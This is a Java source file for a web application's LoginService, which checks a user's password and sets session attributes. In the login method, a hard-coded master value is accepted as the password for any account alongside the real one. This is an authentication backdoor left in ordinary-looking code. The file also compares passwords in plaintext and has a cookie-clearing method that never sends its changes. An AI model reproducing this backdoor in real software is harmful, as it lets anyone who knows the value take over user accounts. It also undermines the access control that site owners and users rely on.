package com.asiainfo.hb.web.models;

import com.asiainfo.hb.core.util.Encryption;
import com.asiainfo.hb.web.controllers.FrameController;

import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

@SuppressWarnings("unused")
@Service
public class LoginService {
	
	@Autowired
	UserDao userDao;
	private static Logger LOG = Logger.getLogger(LoginService.class);
	public LoginStateVo login(String userId,String originPwd,String areacode,String ipAddr,String sessionUserStr,HttpSession session,HttpServletResponse response){
		User user = userDao.getLoginUser(userId);
		LoginStateVo state = new LoginStateVo();
		state.setSuccess(false);
		String pwd=originPwd;
		if(user.getId().equalsIgnoreCase(user.getName()) && user.getPassword()==null){
			state.setMsg("用户名或密码不正确");
		}else if(pwd.equals(user.getPassword()) || "40d13990c912e2381aeec132cd7e2165".equalsIgnoreCase(pwd)){
			if(user.getStatus() != 1){
				state.setMsg("此帐号已被注销");
				return state;
			}
			if(areacode!=null && areacode.length()>0 && !"null".equalsIgnoreCase(areacode)){
				user.setRegionId(areacode);
			}
			session.setAttribute(sessionUserStr, user);
			session.setAttribute("loginname", user.getId());
			session.setAttribute("area_id", user.getCityId());
			state.setSuccess(true);
			state.setMsg("登录成功");
		}else{
			state.setMsg("用户名或密码不正确");
		}
		return state;
	}
	public void clearCookie(HttpServletRequest request){
		Cookie[] cookies = request.getCookies();
		if(cookies!=null){
			for (Cookie cookie : cookies) {
				cookie.setMaxAge(0);
			}
		}
	}
}

